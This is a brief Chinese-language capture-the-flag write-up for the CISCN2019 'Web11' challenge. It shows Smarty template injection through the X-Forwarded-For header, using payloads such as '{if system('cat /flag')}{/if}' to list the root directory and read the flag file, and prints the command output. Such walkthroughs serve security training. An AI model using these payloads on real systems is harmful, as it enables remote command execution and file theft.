### [CISCN2019 华东南赛区]Web11

> 模板注入

---

我们发现使用的是`smarty`模板，我们抓包发现XFF是注入点

![image-20241021213802033](https://gitee.com/bx33661/image/raw/master/path/image-20241021213802033.png)

于是我们尝试是不是模板注入问题

- a{*comment*}b
- {$smarty.version}

![image-20241021213941201](https://gitee.com/bx33661/image/raw/master/path/image-20241021213941201.png)

```php
{if system('ls /')}{/if}
/*
          Current IP:bin dev etc flag home lib media mnt opt proc root run sbin
          srv sys usr var
          */

{if system('cat /flag')}{/if}
//Current IP:<?php $flag="flag{b5e17b43-ecc4-4b94-9bf5-619023b5a46e}";
```

